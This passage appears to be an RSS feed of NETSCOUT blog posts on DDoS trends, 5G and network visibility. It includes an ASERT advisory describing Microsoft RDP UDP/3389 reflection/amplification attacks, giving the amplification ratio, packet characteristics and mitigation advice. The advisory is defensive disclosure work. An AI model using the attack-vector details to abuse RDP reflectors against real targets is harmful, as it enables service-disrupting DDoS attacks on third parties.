  <description>DDoS attacks represent a clear and present danger to service provider networks and services. Industry intelligence is key for keeping up with and staying ahead of perpetrators.</description>
  <content:encoded><![CDATA[<p>As the COVID-19 pandemic unfolded in 2020, nearly the entire global workforce shifted to a work-from-home posture, students began attending classes online, and commerce became primarily a digital activity. With everyone basically stuck at home, service providers quickly became the lifeblood of connectivity, providing vital networks for learning, entertainment, shopping, communications, and work.&nbsp;</p>

<p>Because of their growing importance as an essential service, service provider networks also became a heightened focus of <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service</a> (DDoS) attacks. According to the <a href="https://www.netscout.com/threatreport">1H 2020 NETSCOUT Threat Intelligence Report</a>, telecommunications providers were targeted 492,807 times during the first half of 2020. This represents a 25 percent increase over the same period in 2019.</p>

<p>The Threat Intelligence Report found that DDoS attack vectors have been growing in complexity as well. Since 2017, attacks with more than 15 vectors have increased by 2,851 percent. There also has been an increase in throughput (pps) of 31 percent, while attack duration decreased by 51 percent in the first half of 2020 compared with 2019. This adds up to more complex attacks with a smaller window of response time for defenders, pointing to a growing threat for the industry and a need for better measures to mitigate the risk.</p>

<p><strong>The Stakes Are High </strong></p>

<p>Service providers have a lot at stake. Massive investments at the edge, with increasing requirements for greater automation and intelligence, are creating highly complex environments that put a premium on network, service, and customer availability. The rapid adoption of Internet of Things (IoT) devices also contributes to risk from attacks.</p>

<p>As DDoS attacks proliferate, providers face the unsavory prospect of service downtime, customer churn, and escalating transit and mitigation costs that are ultimately borne by the customer. These cumulative costs are what is known as the “DDoS attack coefficient.”</p>

<p>With DDoS attacks evolving faster than ever before, it is increasingly imperative to put in place an infrastructure mitigation strategy to maintain the availability and performance of networks and services. Such a strategy should provide automated DDoS protection and intelligent, orchestrated mitigation of complex, multivector DDoS attacks.</p>

<p>Service providers may be the targets of these DDoS attacks, but as a result, their customers are directly impacted—and may very well also be an intended target. This presents a revenue opportunity for providers who can offer managed DDoS protection services for their customers.</p>

<p>The bottom line for service providers is that DDoS attacks represent a clear and present danger. The evolving nature of these attacks requires greater vigilance and awareness. Keeping up with and staying ahead of the perpetrators requires gaining critical insights into attack activity worldwide. Having this information in hand is key to fending off future attacks.</p>

  <title>Microsoft Remote Desktop Protocol (RDP) Reflection/Amplification DDoS Attack Mitigation Recommendations - January 2021</title>
  <link>http://localhost:7996/blog/asert/microsoft-remote-desktop-protocol-rdp-reflectionamplification</link>
  <description>Recently observed DDoS attacks leverage abusable Microsoft RDP service to launch UDP Reflection/Amplification attacks with an 85.9:1 amplification factor.</description>
  <content:encoded><![CDATA[<h1>ASERT Threat Summary</h1>

<p>Date/Time: 20Jan2021 2000UTC<br />
Severity: Warning<br />
Distribution:<br />
TLP: <a href="https://www.us-cert.gov/tlp">WHITE</a> (Recipients may share TLP: WHITE information without restriction, subject only to standard copyright rules.)<br />
Categories: Availability</p>

<h1>Overview</h1>

<p><br />
The Microsoft Remote Desktop Protocol (RDP) service included in Microsoft Windows operating systems is intended to provide authenticated remote virtual desktop infrastructure (VDI) access to Windows-based workstations and servers. The RDP service can be configured by Windows systems administrators to run on TCP/3389 and/or UDP/3389.</p>

<p>When enabled on UDP/3389, the Microsoft Windows RDP service may be abused to launch UDP reflection/amplification attacks with an amplification ratio of 85.9:1. The amplified attack traffic consists of non-fragmented UDP packets sourced from UDP/3389 and directed towards the destination IP address(es) and UDP port(s) of the attacker’s choice. In contrast to legitimate RDP session traffic, the amplified attack packets are consistently 1,260 bytes in length, and are padded with long strings of zeroes.&nbsp;Approximately 33,000 abusable Windows RDP servers have been identified, to date.</p>

<p>Observed attack sizes range from ~20 Gbps – ~750 Gbps. As is routinely the case with newer DDoS attack vectors, it appears that after an initial period of employment by advanced attackers with access to bespoke DDoS attack infrastructure, RDP reflection/amplification has been weaponized and added to the arsenals of so-called booter/stresser DDoS-for-hire services, placing it within the reach of the general attacker population.</p>

<h1>Collateral Impact:&nbsp;</h1>

<p>The collateral impact of RDP reflection/amplification attacks is potentially quite high for organizations whose Windows RDP servers are abused as reflectors/amplifiers. This may include partial or full interruption of mission-critical remote-access services, as well as additional service disruption due to transit capacity consumption, state-table exhaustion of stateful firewalls, load balancers, etc.</p>

<p>Wholesale filtering of all UDP/3389-sourced traffic by network operators may potentially overblock legitimate internet traffic, including legitimate RDP remote session replies. &nbsp;</p>

<h1>Mitigating Factors:</h1>

<p>Collateral impact to abusable Windows RDP servers can alert systems administrators to either disable UDP-based service or to deploy Windows RDP servers behind VPN concentrators, thereby preventing them from being utilized in RDP reflection/amplification attacks.</p>

<h1>Recommended Actions:</h1>

<p>Network operators should perform reconnaissance to identify abusable Windows RDP servers on their networks and/or the networks of their downstream customers. It is strongly recommended that RDP servers should be accessible only via VPN services in order to shield them from abuse. If RDP servers offering remote access via UDP cannot immediately be moved behind VPN concentrators, it is strongly recommended that RDP via UDP/3389 be disabled as an interim measure.</p>

<p>All relevant network infrastructure, architectural, and operational Best Current Practices (BCPs) should be implemented by network operators.</p>

<p>Organizations with business-critical public-facing internet properties should ensure that all relevant network infrastructure, architectural, and operational BCPs have been implemented, including situationally specific network access policies that only permit internet traffic via required IP protocols and ports. Internet access network traffic from internal organizational personnel should be deconflated from internet traffic to/from public-facing internet properties and served via separate upstream internet transit links. &nbsp;</p>

<p>DDoS defenses for all public-facing internet properties and supporting infrastructure should be implemented in a situationally appropriate manner, including periodic testing to ensure that any changes to organization’s servers/services/applications are incorporated into its DDoS defense plan. Both organic, on-site intelligent DDoS mitigation capabilities should be combined with cloud- or transit-based upstream DDoS mitigation services in order to ensure maximal responsiveness and flexibility during an attack.</p>

<p>It is imperative that organizations operating mission-critical public-facing internet properties and/or infrastructure ensure that all servers/services/application/datastores/infrastructure elements are protected against DDoS attack and included in periodic, realistic tests of the organization’s DDoS mitigation plan. In many instances, we have encountered situations in which obvious elements such as public-facing Web servers were adequately protected, but authoritative DNS servers, application servers, and other critical service delivery elements were neglected, thus leaving them vulnerable to attack.</p>

<p>Specifics of countermeasure selection, tuning, and deployment will vary based upon the particulars of individual networks/resources; the relevant NETSCOUT Arbor account teams and/or ATAC may be consulted with regards to optimal countermeasure selection and employment.</p>

  <title>Preparing for the Next Wave of 5G/IoT Innovation </title>
  <link>http://localhost:7996/blog/preparing-next-wave-5g-iot-innovation</link>
  <description>Bruce Kelley, Senior Vice President and Chief Technology Officer of NETSCOUT discusses 5G innovation with Stephanie Chang, Global Editorial Director, The Trust, Wall Street Journal.</description>
  <content:encoded><![CDATA[<p>It is no secret that digital transformation strategies, along with innovative technologies such as 5G and Internet of Things (IoT), are accelerating many changes in the modern IT network.</p>

<p>For many companies, reaping the full benefits of <a href="https://www.netscout.com/solutions/5g">5G</a> and IoT is a balancing act. They must continue to deliver flawless services across existing networks while migrating to cloud-native environments that support a dynamic, high-speed 5G network with billions of IoT-connected devices, including a new wave of virtual networking such as network slicing.</p>

<p>5G is not 4G, but faster. Previous technology cycles, such as the switch from 3G to 4G, focused more on benefits such as improved customer experience with mobile devices. However, 5G offers enterprises the opportunity to improve throughput, latency, and reliability at the network’s edge. It will elevate the user experience in many industry verticals, from <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="876dbd0c-1a1b-4aa2-8cdb-a162e5d161f9" href="http://localhost:7996/case-studies/healthcare-improves-telemedicine-patient-experience" title="Healthcare Improves Telemedicine  Patient Experience With NETSCOUT">telemedicine</a> in healthcare to education (immersive learning with AR/VR), <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="91f4c34d-adb4-4e1f-b26c-4dd863ea7514" href="http://localhost:7996/solutions/banking" title="Retail Banking">5G banking</a> (personalized and touchless services), and manufacturing (robotics)</p>

  <title>What to Watch in 2021</title>
  <link>http://localhost:7996/blog/what-watch-2021</link>
  <description>The technologies vital to the world increasingly are being attacked, making vigilance and state-of-the-art security tools essential to protect against incursions.</description>
  <content:encoded><![CDATA[<p>While the world experienced 2020 as a global health crisis, cybercriminals saw it as an opportunity—and they took full advantage. They have stepped up their efforts, launching a record number of distributed denial of service <a href="https://www.netscout.com/what-is-ddos">(DDoS) attacks</a> and other cyber incursions at targets all around the world.</p>

<p>For the first time in history, the annual number of DDoS attacks monitored by the NETSCOUT ATLAS system <a href="https://www.netscout.com/blog/asert/crossing-10-million-mark-ddos-attacks-2020">crossed the 10 million threshold</a>, with NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT) observing 10,089,687 attacks over the course of the year. That’s nearly 1.6 million more attacks than 2019’s count of 8.5 million.</p>

<p>And, according to a recent <a href="https://www.fintechnews.org/the-2020-cybersecurity-stats-you-need-to-know/">report</a>, 80 percent of enterprises have seen an increase in cyberattacks, with big jumps in cloud-based attacks, ransomware, etc., along with increased phishing activity and social engineering.</p>

<p><strong>COVID-19 Has Exposed New Vulnerabilities </strong></p>

<p>Cybercriminals have focused on the shifts associated with the pandemic. For example, the increase in remote work also increased the usage of VPN concentrators, exposing users usually protected by layered enterprise security solutions to a broader range of threats. The need for educational institutions at all levels to offer online learning has also led to <a href="https://www.netscout.com/blog/threat-actors-target-remote-learning-during-covid-19">expanded attention from cybercriminals</a>.</p>

<p>When it comes to DDoS, we have seen an unprecedented number of shorter, faster, and more complex attacks. Moreover, the spread of targets has broadened, with more focus on gaming, healthcare, and e-commerce organizations, with attacks tuned for an immediate impact, with no ramp-up.</p>

<p>Today, complex attacks with 15-plus vectors are common. The latest NETSCOUT <a href="https://www.netscout.com/threatreport">Threat Intelligence Report</a> found that these attacks have increased by 2,851 percent since 2017—they are now one of the most potent weapons in the DDoS attack arsenal.</p>

<p><strong>&nbsp;What’s Coming in 2021? </strong></p>

<p>With all of this in mind, businesses, <a href="https://www.netscout.com/blog/service-provider-ddos-attacks-are-rise">service providers</a>, and individuals must maintain constant vigilance, especially given some of the following shifts we are seeing:</p>

<ol>
	<li><strong>Work-from-home has changed the game. </strong>As organizations have adopted to increased remote work, many have upgraded technology such as VPN concentrators and unified communication and collaboration solutions, as we’d expect. What’s clear, however, is that attackers have taken advantage by targeting that now suddenly vital infrastructure and exploiting the reduction in layered security and policy controls as users move outside of the secured office network.</li>
</ol>

<ol start="2">
	<li><strong>Investment in the ‘ISP edge’ increases security challenges.</strong> In many cases, ISP investment is now focused around capacity and service infrastructure being deployed at the network edge. Centralized deployments of things such as value-added service infrastructure, caching infrastructure, and DDoS mitigation infrastructure have become less desirable. This increased distribution of service infrastructure to the network edge is driving a need to mitigate DDoS attacks “at the edge,” quickly blocking attack traffic at its entry point—regardless of whether it is coming from a peer, a customer, or a public cloud connection—before it has a chance to cause any level of impact. This requires a new level of network defense orchestration, leveraging both intelligent and infrastructure capabilities.</li>
</ol>

<ol start="3">
	<li><strong>Online gaming drives even more DDoS attacks. </strong>Gaming is poised for its next evolution, with cloud gaming and 5G enabling a raft of new services, but, these will succeed only if the industry can guarantee consistent performance and availability. Unfortunately, an increasing number of gamers are now feeling the impact of easy-to-use and powerful online tools that can launch DDoS attacks that can affect an entire game, or a single user’s experience of it. Defending end users and small to midsized businesses from these kinds of attacks using high-scale, high-automation, low-cost ISP or cloud-delivered services is a growing area of discussion.</li>
</ol>

<ol start="4">
	<li><strong>Next-gen mobile services are driving a step-change in visibility and security requirements around mobile communications.</strong> Next-gen mobile services for enterprise and IoT applications have both implicit and explicit security requirements. Mobile network operators are looking at how they can extend their visibility and security capabilities to defend against threats, to ensure that these services are a success for everyone involved.</li>
</ol>

<p>What’s interesting, looking at the list above, is that there is something for everyone. Whether you are an ISP, a mobile operator, an enterprise, or a consumer, there have been shifts during the last year that should make you sit up and take a look at the security of the services and infrastructure you rely on.</p>

  <title>Smart Visibility: The Key to 5G Innovation</title>
  <link>http://localhost:7996/blog/smart-visibility-key-5g-innovation</link>
  <description>Smart visibility enables CSPs to gain better control and make better decisions. The insights gained can allow carriers to innovate with confidence and maximize opportunities.</description>
  <content:encoded><![CDATA[<p>Communications service providers (CSPs) have been hard at work <a href="https://www.netscout.com/blog/achieving-5g-readiness-one-size-does-not-fit-all">rolling out 5G</a> throughout the world. In fact, a recent report predicted that 5G connections will account for 14 percent of all mobile connections in North America alone by 2021. And this represents only the very beginning of paradigm-shifting change for the industry. Of course, bringing 5G online requires enormous investment on the part of CSPs, who must ensure that new services are reliable and the customer experience is exceptional in order to justify the high cost.&nbsp;</p>

<p>Holistic visibility is the key to achieving reliability for 5G networks—and ultimately is key to gaining profitability for technological innovations made possible by 5G’s dramatically faster connectivity. Such visibility into wireless networks can give CSPs the insights they need to optimize network performance and effectively monetize emerging technologies such as smart cities and autonomous vehicles.</p>

<p>What do we mean by that? Smart visibility means the ability to look at live, real-time IP packet data across both physical and virtual/cloud infrastructures. From that, companies can construct smart data—analytics-ready meta data collected and optimized from traffic flows in real time—to provide actionable intelligence built from a real-time, end-to-end view of network, services, technologies, and subscribers.</p>

<p><strong>Smart Visibility Delivers a Definitive Source of Truth </strong></p>

<p>Smart visibility delivers a definitive source of truth, making it possible for carriers to see deep into the most complex parts of their networks and reveal the end-to-end experience down to the subscriber level. This is crucial for staying one step ahead of problems, optimizing the user experience, and automating networks for the greatest possible spectrum efficiency.</p>

<p>The insights delivered by smart visibility give CSPs the ability to:&nbsp;</p>

<ul>
	<li>Plan network upgrades</li>
	<li>Assess technological innovations and provide better support for new services and applications</li>
	<li>Ensure deployment strategies are based on network assessment and will maximize opportunities for new services and monetization</li>
	<li>Compare different vendor infrastructure performances</li>
	<li>Facilitate automation</li>
	<li>Gain more control of networks</li>
	<li>Monitor network performance and enable troubleshooting to meet critical SLAs</li>
</ul>

<p>While smart visibility is instrumental to uncovering vital performance metrics such as latency and capacity, it also delivers the awareness needed to track and set targets related to security, virtualization, network topology, and scalability. This visibility can be crucial in setting the stage for adoption of analytics, artificial intelligence (AI), and machine learning (ML), as well as for the transition to autonomous networks.</p>

<p>CSPs can use smart visibility to make critical decisions, effectively weighting the tradeoffs of various approaches and fine-tuning the direction of infrastructure investments.</p>

<p><strong>Smart Visibility Allows CSPs to Reduce Dependencies </strong></p>

<p>As 5G and virtualization dominate the future direction of CSPs, smart visibility offers an independent approach to reduce dependency on vendors, lower costs, and foster innovation. In today’s multivendor, multitechnology, multicloud ecosystems, complex interoperability depends on reliable open APIs and open source software. Smart visibility makes it possible to coordinate, monitor, and evaluate the interactions among different network functions and various participants in the wireless ecosystem, including vendors, integrators, and enterprises.</p>

<p>Smart visibility enables CSPs to <a href="https://www.netscout.com/sites/default/files/2020-01/SPIG_003-2001%20-%205%20Ways%20to%20Get%205G%20Smarter.pdf">gain better control and make better decisions</a>. The insights gained can allow carriers to innovate with confidence and maximize opportunities to achieve revenue objectives. In the final analysis, smart visibility leads to reliability, which equals increased adoption and retained customers. And that’s the desired outcome.</p>

  <description>Learn how a healthcare organization used their nGeniusONE service assurance solution to troubleshoot and identify the source of a problem impacting their oncology information system application.</description>
  <content:encoded><![CDATA[<p>Applications such as <a href="https://www.netscout.com/blog/hospital-adds-new-visibility-assure-cerner-emr-and-voip">electronic medical records</a> (EMRs) are a critical healthcare tool for delivering safe, secure, swift patient care. But healthcare providers also depend on <a href="https://www.netscout.com/blog/protecting-healthcare-pandemic-times">immediate and consistent acces</a>s to more specific, targeted records management applications, such as Oncology Information Systems (OIS).     </p>

<p>For oncology and cancer-treating specialists, OIS contains a vital array of cancer care information ranging from patient profiles to imaging management, treatment plans, and progress details. The information helps providers in assess patient progress and adjust treatment to optimize results. It is therefore no surprise that adoption of OIS continues to grow based on the advantages of the service as well as the increase in cancer diagnoses worldwide.</p>

<p>For one healthcare organization that has embraced the use of a OIS in their well-respected cancer treatment program, the NETSCOUT nGeniusONE service assurance solution was instrumental in identifying an issue that temporarily prevented the professionals from accessing the OIS.
